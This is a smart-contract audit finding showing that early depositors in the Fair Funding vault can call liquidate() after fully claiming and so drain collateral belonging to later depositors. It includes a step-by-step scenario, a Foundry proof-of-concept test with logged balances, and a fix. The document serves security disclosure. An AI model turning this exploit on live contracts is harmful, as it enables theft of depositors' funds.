# [H] Earlier depositors can steal funds belonging to subsequent depositors

## Summary
Severity: High
Reporter: hickuphh3
Source: https://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L320-L352
Type: audit-issue

## Details
# Earlier depositors can steal funds belonging to subsequent depositors

## Summary
Earlier depositors are able to steal funds belonging to subsequent depositors.

## Vulnerability Detail
In some sense, claims are mixed with liquidations, because both withdraw collateral. Since claims are uncapped and don't decrease the token holder's shares, it is possible for a token holder to have fully redeemed his original loaned amount, yet still perform a liquidation (in essence, using subsequent depositor's shares to extract more collateral).

## POC

### Scenario
1. Alice deposits 1 WETH, 0.5 alETH is minted
2. Loan is fully repaid (could be partial, but full repayment is easier to grasp).
3. Alice is withdraws the full 1 WETH collateral by marking all vault shares claimable, then claiming it
4. Bob deposits 1.1 WETH, ~ 0.55 alETH is minted.
5. Alice is able to then call `liquidate()`. Since her shares represent 1 WETH of collateral, she's effectively stealing 1 WETH from Bob. 0.45 WETH goes to her, 0.55 WETH is used to pay for the debt.
6. Bob is then only able to recover 0.1 WETH.

### Foundry Test
Note that this will require fixes regarding the first deposit and claimable value calculations in order to pass.
```solidity
function testStealingFundsThroughLiquidation() public {
        uint256 depositAmt = 1e18;

        // Step 1: admin makes a deposit
        vault.register_deposit(1, depositAmt);

        // Step 2: fully pay off loan
        (int256 vaultDebt,) = alchemist.accounts(vaultAdd);
        alchemist.repay(
            address(weth),
            alchemist.normalizeDebtTokensToUnderlying(address(weth), uint256(vaultDebt)),
            vaultAdd
        );

        // Step 3: mark as fully claimable -> burn all vault shares
        uint256 vaultShares;
        (vaultShares, ) = alchemist.positions(vaultAdd, yieldToken);
        vault.withdraw_underlying_to_claim(
            vaultShares,
            0
        );

        // check that all vaultShares have been redeemed
        (vaultShares, ) = alchemist.positions(vaultAdd, yieldToken);
        assertEq(vaultShares, 0);

        // Step 4: admin claims ~1 ETH
        uint256 wethBalBefore = weth.balanceOf(admin);
        vault.claim(1);

        // Step 5: user1 deposits 1.1 ETH
        uint256 userDepositAmt = depositAmt * 110 / 100;
        vm.stopPrank();
        vm.prank(user1);
        vault.register_deposit(2, userDepositAmt);

        // Step 5.5: Repay a little because liquidation will fail from undercollateralisation
        vm.prank(user2);
        alchemist.repay(address(weth), 0.01e18, vaultAdd);

        // Step 6: admin then liquidates -> steals funds belonging to user1's shares
        vm.prank(admin);
        vault.liquidate(1, 0);
        uint256 wethBalAfter = weth.balanceOf(admin);

        // assert that admin got more funds than entitled
        // 1 ETH claimed originally + 0.5 ETH from liquidation (the other 0.5 ETH used for debt repayment)
        assertGt(wethBalAfter - wethBalBefore, depositAmt * 150 / 100);
        console.log("Admin total obtained WETH:", wethBalAfter - wethBalBefore);

        // user1 will only be able to recover 1.1 ETH - 1 ETH ~= 0.1 ETH
        // liquidation not possible because of uncollateralisation
        // only way is to fully repay loan, then mark as claimable
        wethBalBefore = weth.balanceOf(user1);

        (vaultDebt,) = alchemist.accounts(vaultAdd);
        vm.startPrank(user2);
        alchemist.repay(
            address(weth),
            alchemist.normalizeDebtTokensToUnderlying(address(weth), uint256(vaultDebt)),
            vaultAdd
        );

        // Step 3: mark as fully claimable -> burn all vault shares
        (vaultShares, ) = alchemist.positions(vaultAdd, yieldToken);
        vault.withdraw_underlying_to_claim(
            vaultShares,
            0
        );
        vm.stopPrank();
        vm.prank(user1);
        vault.claim(2);
        wethBalAfter = weth.balanceOf(user1);
        // will be ~0.1 ETH
        console.log("User total obtained WETH:", wethBalAfter - wethBalBefore);
    }
```
<img width="510" alt="image" src="https://user-images.githubusercontent.com/87458768/219589109-de1e12d4-876f-4385-b45c-506f311370d5.png">
We can see that the admin (Alice) was able to walk away with `1509090878299570667`, which is her original 1 WETH deposit + 0.5 WETH from the liquidation. User1 (Bob) was only able to recover `99999299051482938` ~= 0.1 WETH.

## Impact

## Code Snippet
https://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L320-L352
https://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L374-L404

## Tool used
Foundry, Mainnet Forking, Manual Review

## Recommendation
Claims should be minting debt instead of withdrawing collateral.
